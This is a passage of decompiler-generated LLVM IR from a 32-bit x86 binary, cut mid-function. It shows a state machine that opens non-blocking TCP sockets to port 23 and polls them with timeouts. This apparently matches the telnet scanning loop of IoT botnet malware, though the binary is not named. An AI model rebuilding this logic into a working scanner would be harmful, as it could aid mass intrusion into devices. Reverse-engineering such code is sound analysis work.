  %v2_804a2d3 = inttoptr i32 %v1_804a2d3 to i32*
  store i32 0, i32* %v2_804a2d3, align 4
  %v0_804a2db = load i32, i32* %edx.global-to-local, align 4
  %v1_804a2db = load i32, i32* @esp, align 4
  %v2_804a2db = inttoptr i32 %v1_804a2db to i32*
  store i32 %v0_804a2db, i32* %v2_804a2db, align 4
  %v3_804a2de = inttoptr i32 %storemerge548 to i8*
  %v4_804a2de = call i32 @function_804f698(i8* %v3_804a2de, i32 %tmp60, i32 %tmp65)
  %v4_804a2e3 = add nuw nsw i32 %storemerge548, 1
  store i32 %v4_804a2e3, i32* %eax.global-to-local, align 4
  %v5_804a2ec = icmp slt i32 %v4_804a2e3, %.v2_804a1b4
  br i1 %v5_804a2ec, label %dec_label_pc_804a27a, label %dec_label_pc_804a2ee.preheader

dec_label_pc_804a2ee.preheader:                   ; preds = %dec_label_pc_804a18e, %dec_label_pc_804a27a
  %v2_804a692 = ptrtoint i32* %stack_var_-172 to i32
  %tmp85 = bitcast i32* %stack_var_-172 to i8*
  %v2_804a6fe = ptrtoint i32* %stack_var_-180 to i32
  %v2_804a75d = ptrtoint i32* %stack_var_-184 to i32
  %v2_804a767 = ptrtoint i32* %stack_var_-188 to i32
  %v2_804a309 = or i32 %v2_804a245, 8
  %v2_804a415 = or i32 %v2_804a245, 11
  %.pre = or i32 %v2_804a245, 10
  %v2_804ab1c = add i32 %v2_804a245, 16
  br label %dec_label_pc_804a2ee.outer

dec_label_pc_804a2ee.outer:                       ; preds = %dec_label_pc_804b759, %dec_label_pc_804a2ee.preheader
  %stack_var_-224.0.ph = phi i32 [ %tmp59, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-224.1, %dec_label_pc_804b759 ]
  %stack_var_-228.0.ph = phi i32 [ %tmp58, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-228.1, %dec_label_pc_804b759 ]
  %stack_var_-232.0.ph = phi i32 [ %tmp57, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-232.1, %dec_label_pc_804b759 ]
  %stack_var_-236.0.ph = phi i32 [ %tmp56, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-236.1, %dec_label_pc_804b759 ]
  %stack_var_-240.0.ph = phi i32 [ %tmp55, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-240.1, %dec_label_pc_804b759 ]
  %stack_var_-244.0.ph = phi i8* [ %tmp54, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-244.1, %dec_label_pc_804b759 ]
  %stack_var_-248.0.ph = phi i8* [ %tmp53, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-248.1, %dec_label_pc_804b759 ]
  %stack_var_-252.0.ph = phi i8* [ %tmp52, %dec_label_pc_804a2ee.preheader ], [ %stack_var_-252.1, %dec_label_pc_804b759 ]
  br label %dec_label_pc_804a2ee

dec_label_pc_804a2ee:                             ; preds = %dec_label_pc_804a2ee.outer, %dec_label_pc_804a2ee
  br i1 %v5_804a2ec47, label %dec_label_pc_804a2fa.preheader, label %dec_label_pc_804a2ee

dec_label_pc_804a2fa.preheader:                   ; preds = %dec_label_pc_804a2ee
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a2fa

dec_label_pc_804a2fa:                             ; preds = %dec_label_pc_804a2fa.preheader, %dec_label_pc_804b759
  %v1_804a425 = phi i32 [ %v4_804b759, %dec_label_pc_804b759 ], [ 0, %dec_label_pc_804a2fa.preheader ]
  %stack_var_-252.229 = phi i8* [ %stack_var_-252.1, %dec_label_pc_804b759 ], [ %stack_var_-252.0.ph, %dec_label_pc_804a2fa.preheader ]
  %stack_var_-248.227 = phi i8* [ %stack_var_-248.1, %dec_label_pc_804b759 ], [ %stack_var_-248.0.ph, %dec_label_pc_804a2fa.preheader ]
  %stack_var_-244.225 = phi i8* [ %stack_var_-244.1, %dec_label_pc_804b759 ], [ %stack_var_-244.0.ph, %dec_label_pc_804a2fa.preheader ]
  %stack_var_-240.223 = phi i32 [ %stack_var_-240.1, %dec_label_pc_804b759 ], [ %stack_var_-240.0.ph, %dec_label_pc_804a2fa.preheader ]
  %stack_var_-236.221 = phi i32 [ %stack_var_-236.1, %dec_label_pc_804b759 ], [ %stack_var_-236.0.ph, %dec_label_pc_804a2fa.preheader ]
  %stack_var_-232.219 = phi i32 [ %stack_var_-232.1, %dec_label_pc_804b759 ], [ %stack_var_-232.0.ph, %dec_label_pc_804a2fa.preheader ]
  %stack_var_-228.217 = phi i32 [ %stack_var_-228.1, %dec_label_pc_804b759 ], [ %stack_var_-228.0.ph, %dec_label_pc_804a2fa.preheader ]
  %stack_var_-224.215 = phi i32 [ %stack_var_-224.1, %dec_label_pc_804b759 ], [ %stack_var_-224.0.ph, %dec_label_pc_804a2fa.preheader ]
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v2_804a306 = mul nuw nsw i32 %v1_804a425, 24
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a309 = add i32 %v2_804a309, %v2_804a306
  %v4_804a309 = inttoptr i32 %v3_804a309 to i8*
  %v5_804a309 = load i8, i8* %v4_804a309, align 8
  %v6_804a309 = zext i8 %v5_804a309 to i32
  store i32 %v6_804a309, i32* %eax.global-to-local, align 4
  store i32 %v6_804a309, i32* %edx.global-to-local, align 4
  %v1_804a32a = mul nuw nsw i32 %v6_804a309, 4
  %v2_804a32a = add nuw nsw i32 %v1_804a32a, 134557324
  %v3_804a32a = inttoptr i32 %v2_804a32a to i32*
  %v4_804a32a = load i32, i32* %v3_804a32a, align 4
  store i32 %v4_804a32a, i32* %eax.global-to-local, align 4
  switch i8 %v5_804a309, label %dec_label_pc_804b759 [
    i8 0, label %dec_label_pc_804a333
    i8 1, label %dec_label_pc_804a64a
    i8 2, label %dec_label_pc_804a96b
    i8 3, label %dec_label_pc_804ab98
    i8 4, label %dec_label_pc_804acfc
    i8 5, label %dec_label_pc_804afa8
    i8 6, label %dec_label_pc_804b10c
    i8 7, label %dec_label_pc_804b443
    i8 8, label %dec_label_pc_804b5e5
  ]

dec_label_pc_804a333:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v2_804a342 = add i32 %v2_804a306, %v2_804a245
  %v1_804a344 = add i32 %v2_804a342, 20
  store i32 %v1_804a344, i32* %eax.global-to-local, align 4
  %v1_804a347 = inttoptr i32 %v1_804a344 to i32*
  %v2_804a347 = load i32, i32* %v1_804a347, align 4
  store i32 %v2_804a347, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804a350 = load i32, i32* @esp, align 4
  %v2_804a350 = add i32 %v1_804a350, 8
  %v3_804a350 = inttoptr i32 %v2_804a350 to i32*
  store i32 1024, i32* %v3_804a350, align 4
  %v0_804a354 = load i32, i32* @esp, align 4
  %v1_804a354 = add i32 %v0_804a354, 4
  %v2_804a354 = inttoptr i32 %v1_804a354 to i32*
  store i32 0, i32* %v2_804a354, align 4
  %v0_804a35c = load i32, i32* %edx.global-to-local, align 4
  %v1_804a35c = load i32, i32* @esp, align 4
  %v2_804a35c = inttoptr i32 %v1_804a35c to i32*
  store i32 %v0_804a35c, i32* %v2_804a35c, align 4
  %v3_804a35f = inttoptr i32 %v6_804a309 to i8*
  %v4_804a35f = call i32 @function_804f698(i8* %v3_804a35f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a373 = add i32 %v2_804a289, %v2_804a306
  %v4_804a373 = inttoptr i32 %v3_804a373 to i8*
  %v5_804a373 = load i8, i8* %v4_804a373, align 1
  %v4_804a378 = icmp eq i8 %v5_804a373, 0
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  br i1 %v4_804a378, label %dec_label_pc_804a406, label %dec_label_pc_804a380

dec_label_pc_804a380:                             ; preds = %dec_label_pc_804a333
  store i32 %v1_804a344, i32* %eax.global-to-local, align 4
  %v2_804a394 = load i32, i32* %v1_804a347, align 4
  store i32 %v2_804a342, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a3b0 = inttoptr i32 %v2_804a342 to i32*
  store i32 0, i32* %v2_804a3b0, align 8
  %v0_804a3b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3b2 = add i32 %v0_804a3b2, 4
  store i32 %v1_804a3b2, i32* %eax.global-to-local, align 4
  %v0_804a3b5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a3b5 = inttoptr i32 %v1_804a3b2 to i32*
  store i32 %v0_804a3b5, i32* %v2_804a3b5, align 4
  %v0_804a3b7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3b7 = add i32 %v0_804a3b7, 4
  store i32 %v1_804a3b7, i32* %eax.global-to-local, align 4
  %v0_804a3ba = load i32, i32* %edx.global-to-local, align 4
  %v2_804a3ba = inttoptr i32 %v1_804a3b7 to i32*
  store i32 %v0_804a3ba, i32* %v2_804a3ba, align 4
  %v0_804a3bc = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3bc = add i32 %v0_804a3bc, 4
  store i32 %v1_804a3bc, i32* %eax.global-to-local, align 4
  %v0_804a3bf = load i32, i32* %edx.global-to-local, align 4
  %v2_804a3bf = inttoptr i32 %v1_804a3bc to i32*
  store i32 %v0_804a3bf, i32* %v2_804a3bf, align 4
  %v0_804a3c1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3c1 = add i32 %v0_804a3c1, 4
  store i32 %v1_804a3c1, i32* %eax.global-to-local, align 4
  %v0_804a3c4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a3c4 = inttoptr i32 %v1_804a3c1 to i32*
  store i32 %v0_804a3c4, i32* %v2_804a3c4, align 4
  %v0_804a3c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a3c6 = add i32 %v0_804a3c6, 4
  %v0_804a3c9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a3c9 = inttoptr i32 %v1_804a3c6 to i32*
  store i32 %v0_804a3c9, i32* %v2_804a3c9, align 4
  store i32 %v1_804a344, i32* %edx.global-to-local, align 4
  store i32 %v2_804a394, i32* @eax, align 4
  store i32 %v2_804a394, i32* %v1_804a347, align 4
  store i32 %v1_804a425, i32* @ebx, align 4
  %v1_804a3e7 = call i32 @function_8049bbe(i32 %v2_804a394)
  store i32 %v2_804a245, i32* %edx.global-to-local, align 4
  %v0_804a3f1 = load i32, i32* @ebx, align 4
  %v2_804a3f7 = mul i32 %v0_804a3f1, 24
  %v2_804a3fa = add i32 %v2_804a3f7, %v2_804a245
  %v1_804a3fc = or i32 %v2_804a3fa, 4
  store i32 %v1_804a3fc, i32* %eax.global-to-local, align 4
  %v2_804a3ff = inttoptr i32 %v1_804a3fc to i32*
  store i32 %v1_804a3e7, i32* %v2_804a3ff, align 4
  br label %dec_label_pc_804a4b3

dec_label_pc_804a406:                             ; preds = %dec_label_pc_804a333
  %v3_804a415 = add i32 %v2_804a415, %v2_804a306
  %v4_804a415 = inttoptr i32 %v3_804a415 to i8*
  %v5_804a415 = load i8, i8* %v4_804a415, align 1
  %v2_804a41a = load i32, i32* @ebx, align 4
  %v2_804a41c = add i8 %v5_804a415, 1
  %v14_804a41c = zext i8 %v2_804a41c to i32
  %v16_804a41c = and i32 %v2_804a41a, -256
  %v17_804a41c = or i32 %v16_804a41c, %v14_804a41c
  store i32 %v17_804a41c, i32* @ebx, align 4
  store i8 %v2_804a41c, i8* %v4_804a415, align 1
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v5_804a43d = load i8, i8* %v4_804a415, align 1
  %v6_804a43d = zext i8 %v5_804a43d to i32
  store i32 %v6_804a43d, i32* %eax.global-to-local, align 4
  %v10_804a442 = icmp eq i8 %v5_804a43d, 10
  %v1_804a444 = icmp eq i1 %v10_804a442, false
  br i1 %v1_804a444, label %dec_label_pc_804a406.dec_label_pc_804a482_crit_edge, label %dec_label_pc_804a446

dec_label_pc_804a406.dec_label_pc_804a482_crit_edge: ; preds = %dec_label_pc_804a406
  %.pre49 = add i32 %.pre, %v2_804a306
  %.pre50 = inttoptr i32 %.pre49 to i8*
  br label %dec_label_pc_804a482

dec_label_pc_804a446:                             ; preds = %dec_label_pc_804a406
  store i8 0, i8* %v4_804a415, align 1
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a469 = add i32 %.pre, %v2_804a306
  %v4_804a469 = inttoptr i32 %v3_804a469 to i8*
  %v5_804a469 = load i8, i8* %v4_804a469, align 2
  %v2_804a46e = load i32, i32* @ebx, align 4
  %v2_804a470 = add i8 %v5_804a469, 1
  %v14_804a470 = zext i8 %v2_804a470 to i32
  %v16_804a470 = and i32 %v2_804a46e, -256
  %v17_804a470 = or i32 %v16_804a470, %v14_804a470
  store i32 %v17_804a470, i32* @ebx, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  store i8 %v2_804a470, i8* %v4_804a469, align 2
  br label %dec_label_pc_804a482

dec_label_pc_804a482:                             ; preds = %dec_label_pc_804a406.dec_label_pc_804a482_crit_edge, %dec_label_pc_804a446
  %v4_804a491.pre-phi = phi i8* [ %.pre50, %dec_label_pc_804a406.dec_label_pc_804a482_crit_edge ], [ %v4_804a469, %dec_label_pc_804a446 ]
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v5_804a491 = load i8, i8* %v4_804a491.pre-phi, align 1
  %v6_804a491 = zext i8 %v5_804a491 to i32
  store i32 %v6_804a491, i32* %eax.global-to-local, align 4
  %v10_804a496 = icmp eq i8 %v5_804a491, 3
  %v1_804a498 = icmp eq i1 %v10_804a496, false
  br i1 %v1_804a498, label %dec_label_pc_804a482.dec_label_pc_804a4b3_crit_edge, label %dec_label_pc_804a49a

dec_label_pc_804a482.dec_label_pc_804a4b3_crit_edge: ; preds = %dec_label_pc_804a482
  %.pre51 = inttoptr i32 %v2_804a342 to i32*
  br label %dec_label_pc_804a4b3

dec_label_pc_804a49a:                             ; preds = %dec_label_pc_804a482
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804a373, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804a4b3:                             ; preds = %dec_label_pc_804a482.dec_label_pc_804a4b3_crit_edge, %dec_label_pc_804a380
  %v3_804a543.pre-phi = phi i32* [ %.pre51, %dec_label_pc_804a482.dec_label_pc_804a4b3_crit_edge ], [ %v2_804a3b0, %dec_label_pc_804a380 ]
  store i32 2, i32* %stack_var_-204, align 4
  %v0_804a4bc = load i32, i32* @esp, align 4
  %v1_804a4bc = inttoptr i32 %v0_804a4bc to i32*
  store i32 23, i32* %v1_804a4bc, align 4
  %v0_804a4c3 = load i32, i32* %stack_var_-204, align 4
  %v1_804a4c3 = trunc i32 %v0_804a4c3 to i16
  %v2_804a4c3 = call i32 @function_804f998(i16 %v1_804a4c3)
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v1_804a4f9 = or i32 %v2_804a342, 4
  store i32 %v1_804a4f9, i32* %eax.global-to-local, align 4
  %v1_804a4fc = inttoptr i32 %v1_804a4f9 to i32*
  %v2_804a4fc = load i32, i32* %v1_804a4fc, align 4
  store i32 %v2_804a4fc, i32* %eax.global-to-local, align 4
  store i32 %v1_804a425, i32* @ebx, align 4
  %v0_804a507 = load i32, i32* @esp, align 4
  %v1_804a507 = add i32 %v0_804a507, 8
  %v2_804a507 = inttoptr i32 %v1_804a507 to i32*
  store i32 0, i32* %v2_804a507, align 4
  %v0_804a50f = load i32, i32* @esp, align 4
  %v1_804a50f = add i32 %v0_804a50f, 4
  %v2_804a50f = inttoptr i32 %v1_804a50f to i32*
  store i32 1, i32* %v2_804a50f, align 4
  %v0_804a517 = load i32, i32* @esp, align 4
  %v1_804a517 = inttoptr i32 %v0_804a517 to i32*
  store i32 2, i32* %v1_804a517, align 4
  %sext = mul i32 %v2_804a4c3, 65536
  %v4_804a51e = sdiv i32 %sext, 65536
  %v5_804a51e = call i32 @function_804fbc8(i32 %v4_804a51e, i32 %v2_804a4fc, i32 0, i32 0)
  %v0_804a528 = load i32, i32* @ebx, align 4
  %v2_804a52e = mul i32 %v0_804a528, 24
  %v3_804a531 = add i32 %v2_804a52e, %v2_804a245
  %v4_804a531 = inttoptr i32 %v3_804a531 to i32*
  store i32 %v5_804a51e, i32* %v4_804a531, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a543 = load i32, i32* %v3_804a543.pre-phi, align 4
  store i32 %v4_804a543, i32* %eax.global-to-local, align 4
  %v10_804a546 = icmp eq i32 %v4_804a543, -1
  br i1 %v10_804a546, label %dec_label_pc_804b759, label %dec_label_pc_804a54f

dec_label_pc_804a54f:                             ; preds = %dec_label_pc_804a4b3
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a55e = load i32, i32* %v3_804a543.pre-phi, align 4
  store i32 %v4_804a55e, i32* %eax.global-to-local, align 4
  %v0_804a561 = load i32, i32* @esp, align 4
  %v1_804a561 = add i32 %v0_804a561, 8
  %v2_804a561 = inttoptr i32 %v1_804a561 to i32*
  store i32 0, i32* %v2_804a561, align 4
  %v0_804a569 = load i32, i32* @esp, align 4
  %v1_804a569 = add i32 %v0_804a569, 4
  %v2_804a569 = inttoptr i32 %v1_804a569 to i32*
  store i32 3, i32* %v2_804a569, align 4
  %v0_804a571 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a571 = load i32, i32* @esp, align 4
  %v2_804a571 = inttoptr i32 %v1_804a571 to i32*
  store i32 %v0_804a571, i32* %v2_804a571, align 4
  %v3_804a574 = call i32 @function_804e1dc(i32 %v2_804a4fc, i32 0, i32 0)
  %v1_804a57b = or i32 %v3_804a574, 2048
  store i32 %v1_804a57b, i32* @ebx, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a590 = load i32, i32* %v3_804a543.pre-phi, align 4
  store i32 %v4_804a590, i32* %eax.global-to-local, align 4
  %v1_804a593 = load i32, i32* @esp, align 4
  %v2_804a593 = add i32 %v1_804a593, 8
  %v3_804a593 = inttoptr i32 %v2_804a593 to i32*
  store i32 %v1_804a57b, i32* %v3_804a593, align 4
  %v0_804a597 = load i32, i32* @esp, align 4
  %v1_804a597 = add i32 %v0_804a597, 4
  %v2_804a597 = inttoptr i32 %v1_804a597 to i32*
  store i32 4, i32* %v2_804a597, align 4
  %v0_804a59f = load i32, i32* %eax.global-to-local, align 4
  %v1_804a59f = load i32, i32* @esp, align 4
  %v2_804a59f = inttoptr i32 %v1_804a59f to i32*
  store i32 %v0_804a59f, i32* %v2_804a59f, align 4
  %v3_804a5a2 = call i32 @function_804e1dc(i32 %v2_804a4fc, i32 0, i32 0)
  store i32 %v2_804a200, i32* @ebx, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a5bc = load i32, i32* %v3_804a543.pre-phi, align 4
  store i32 %v4_804a5bc, i32* %eax.global-to-local, align 4
  %v0_804a5bf = load i32, i32* @esp, align 4
  %v1_804a5bf = add i32 %v0_804a5bf, 8
  %v2_804a5bf = inttoptr i32 %v1_804a5bf to i32*
  store i32 16, i32* %v2_804a5bf, align 4
  %v1_804a5c7 = load i32, i32* @esp, align 4
  %v2_804a5c7 = add i32 %v1_804a5c7, 4
  %v3_804a5c7 = inttoptr i32 %v2_804a5c7 to i32*
  store i32 %v2_804a200, i32* %v3_804a5c7, align 4
  %v0_804a5cb = load i32, i32* %eax.global-to-local, align 4
  %v1_804a5cb = load i32, i32* @esp, align 4
  %v2_804a5cb = inttoptr i32 %v1_804a5cb to i32*
  store i32 %v0_804a5cb, i32* %v2_804a5cb, align 4
  %v3_804a5ce = call i32 @function_804fa4c(i32 %v2_804a4fc, i32 0, i32 0)
  store i32 %v3_804a5ce, i32* %eax.global-to-local, align 4
  %v10_804a5d3 = icmp eq i32 %v3_804a5ce, -1
  %v1_804a5d6 = icmp eq i1 %v10_804a5d3, false
  br i1 %v1_804a5d6, label %dec_label_pc_804a617, label %dec_label_pc_804a5d8

dec_label_pc_804a5d8:                             ; preds = %dec_label_pc_804a54f
  %v1_804a5d8 = call i32 @function_804e694(i32 %v2_804a4fc)
  store i32 %v1_804a5d8, i32* %eax.global-to-local, align 4
  %v1_804a5dd = inttoptr i32 %v1_804a5d8 to i32*
  %v2_804a5dd = load i32, i32* %v1_804a5dd, align 4
  store i32 %v2_804a5dd, i32* %eax.global-to-local, align 4
  %v9_804a5df = icmp eq i32 %v2_804a5dd, 115
  br i1 %v9_804a5df, label %dec_label_pc_804a617, label %dec_label_pc_804a5e4

dec_label_pc_804a5e4:                             ; preds = %dec_label_pc_804a5d8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a5f3 = load i32, i32* %v3_804a543.pre-phi, align 4
  store i32 %v4_804a5f3, i32* %eax.global-to-local, align 4
  %v1_804a5f6 = load i32, i32* @esp, align 4
  %v2_804a5f6 = inttoptr i32 %v1_804a5f6 to i32*
  store i32 %v4_804a5f3, i32* %v2_804a5f6, align 4
  %v1_804a5f9 = call i32 @function_804a162(i32 %v2_804a4fc)
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804a373, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804a617:                             ; preds = %dec_label_pc_804a5d8, %dec_label_pc_804a54f
  store i8 1, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v1_804a63c = add i32 %v2_804a342, 12
  store i32 %v1_804a63c, i32* %eax.global-to-local, align 4
  %v1_804a63f = inttoptr i32 %v1_804a63c to i32*
  store i32 0, i32* %v1_804a63f, align 4
  br label %dec_label_pc_804b759

dec_label_pc_804a64a:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v2_804a659 = add i32 %v2_804a306, %v2_804a245
  %v1_804a65b = add i32 %v2_804a659, 12
  store i32 %v1_804a65b, i32* %eax.global-to-local, align 4
  %v1_804a65e = inttoptr i32 %v1_804a65b to i32*
  %v2_804a65e = load i32, i32* %v1_804a65e, align 4
  store i32 %v2_804a65e, i32* %eax.global-to-local, align 4
  %v1_804a660 = icmp eq i32 %v2_804a65e, 0
  %v1_804a662 = icmp eq i1 %v1_804a660, false
  br i1 %v1_804a662, label %dec_label_pc_804a688, label %dec_label_pc_804a664

dec_label_pc_804a664:                             ; preds = %dec_label_pc_804a64a
  store i32 %v1_804a425, i32* @ebx, align 4
  %v0_804a667 = load i32, i32* @esp, align 4
  %v1_804a667 = inttoptr i32 %v0_804a667 to i32*
  store i32 0, i32* %v1_804a667, align 4
  %v1_804a66e = inttoptr i32 %v6_804a309 to i32*
  %v2_804a66e = call i32 @function_804e5dc(i32* %v1_804a66e)
  store i32 %v2_804a245, i32* %edx.global-to-local, align 4
  %v0_804a678 = load i32, i32* @ebx, align 4
  %v2_804a67e = mul i32 %v0_804a678, 24
  %v2_804a681 = add i32 %v2_804a67e, %v2_804a245
  %v1_804a683 = add i32 %v2_804a681, 12
  store i32 %v1_804a683, i32* %eax.global-to-local, align 4
  %v2_804a686 = inttoptr i32 %v1_804a683 to i32*
  store i32 %v2_804a66e, i32* %v2_804a686, align 4
  br label %dec_label_pc_804a688

dec_label_pc_804a688:                             ; preds = %dec_label_pc_804a64a, %dec_label_pc_804a664
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804a692, i32* @edi, align 4
  %v5_804a699 = call i8* @_memset(i8* %tmp85, i32 0, i32 32)
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a6b0 = inttoptr i32 %v2_804a659 to i32*
  %v4_804a6b0 = load i32, i32* %v3_804a6b0, align 8
  %v2_804a6b5 = udiv i32 %v4_804a6b0, 32
  store i32 %v2_804a6b5, i32* @ebx, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a6c7 = load i32, i32* %v3_804a6b0, align 8
  %v1_804a6ca = urem i32 %v4_804a6c7, 32
  store i32 %v1_804a6ca, i32* %eax.global-to-local, align 4
  %v0_804a6cd = load i32, i32* @ebp, align 4
  %v2_804a6cd = mul nuw nsw i32 %v2_804a6b5, 4
  %v3_804a6cd = add nsw i32 %v2_804a6cd, -168
  %v4_804a6cd = add i32 %v3_804a6cd, %v0_804a6cd
  %v5_804a6cd = inttoptr i32 %v4_804a6cd to i32*
  %v6_804a6cd = load i32, i32* %v5_804a6cd, align 4
  %v9_804a6cd = shl i32 1, %v1_804a6ca
  %v12_804a6cd = or i32 %v6_804a6cd, %v9_804a6cd
  store i32 %v12_804a6cd, i32* %v5_804a6cd, align 4
  store i32 0, i32* %stack_var_-180, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a6f8 = load i32, i32* %v3_804a6b0, align 8
  %v1_804a6fb = add i32 %v4_804a6f8, 1
  store i32 %v1_804a6fb, i32* %edx.global-to-local, align 4
  %v1_804a704 = load i32, i32* @esp, align 4
  %v2_804a704 = add i32 %v1_804a704, 16
  %v3_804a704 = inttoptr i32 %v2_804a704 to i32*
  store i32 %v2_804a6fe, i32* %v3_804a704, align 4
  %v0_804a708 = load i32, i32* @esp, align 4
  %v1_804a708 = add i32 %v0_804a708, 12
  %v2_804a708 = inttoptr i32 %v1_804a708 to i32*
  store i32 0, i32* %v2_804a708, align 4
  store i32 %v2_804a692, i32* %eax.global-to-local, align 4
  %v1_804a716 = load i32, i32* @esp, align 4
  %v2_804a716 = add i32 %v1_804a716, 8
  %v3_804a716 = inttoptr i32 %v2_804a716 to i32*
  store i32 %v2_804a692, i32* %v3_804a716, align 4
  %v0_804a71a = load i32, i32* @esp, align 4
  %v1_804a71a = add i32 %v0_804a71a, 4
  %v2_804a71a = inttoptr i32 %v1_804a71a to i32*
  store i32 0, i32* %v2_804a71a, align 4
  %v0_804a722 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a722 = load i32, i32* @esp, align 4
  %v2_804a722 = inttoptr i32 %v1_804a722 to i32*
  store i32 %v0_804a722, i32* %v2_804a722, align 4
  %v0_804a725 = load i32, i32* %stack_var_-180, align 4
  %v2_804a725 = load i32, i32* %stack_var_-172, align 4
  %v5_804a725 = call i32 @function_804e51c(i32 %v0_804a725, i32 10000, i32 %v2_804a725, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804a725, i32* %eax.global-to-local, align 4
  %v12_804a72d = icmp eq i32 %v5_804a725, 1
  %v1_804a731 = icmp eq i1 %v12_804a72d, false
  br i1 %v1_804a731, label %dec_label_pc_804a8af, label %dec_label_pc_804a737

dec_label_pc_804a737:                             ; preds = %dec_label_pc_804a688
  store i32 4, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-188, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a75a = load i32, i32* %v3_804a6b0, align 8
  store i32 %v4_804a75a, i32* %edx.global-to-local, align 4
  %v1_804a763 = load i32, i32* @esp, align 4
  %v2_804a763 = add i32 %v1_804a763, 16
  %v3_804a763 = inttoptr i32 %v2_804a763 to i32*
  store i32 %v2_804a75d, i32* %v3_804a763, align 4
  store i32 %v2_804a767, i32* %eax.global-to-local, align 4
  %v1_804a76d = load i32, i32* @esp, align 4
  %v2_804a76d = add i32 %v1_804a76d, 12
  %v3_804a76d = inttoptr i32 %v2_804a76d to i32*
  store i32 %v2_804a767, i32* %v3_804a76d, align 4
  %v0_804a771 = load i32, i32* @esp, align 4
  %v1_804a771 = add i32 %v0_804a771, 8
  %v2_804a771 = inttoptr i32 %v1_804a771 to i32*
  store i32 4, i32* %v2_804a771, align 4
  %v0_804a779 = load i32, i32* @esp, align 4
  %v1_804a779 = add i32 %v0_804a779, 4
  %v2_804a779 = inttoptr i32 %v1_804a779 to i32*
  store i32 1, i32* %v2_804a779, align 4
  %v0_804a781 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a781 = load i32, i32* @esp, align 4
  %v2_804a781 = inttoptr i32 %v1_804a781 to i32*
  store i32 %v0_804a781, i32* %v2_804a781, align 4
  %v0_804a784 = load i32, i32* %stack_var_-188, align 4
  %v1_804a784 = load i32, i32* %stack_var_-184, align 4
  %v2_804a784 = load i32, i32* %stack_var_-180, align 4
  %v4_804a784 = load i32, i32* %stack_var_-172, align 4
  %v5_804a784 = call i32 @function_804faa4(i32 %v0_804a784, i32 %v1_804a784, i32 %v2_804a784, i32 10000, i32 %v4_804a784)
  %v3_804a789 = load i32, i32* %stack_var_-188, align 4
  %v1_804a78f = icmp eq i32 %v3_804a789, 0
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
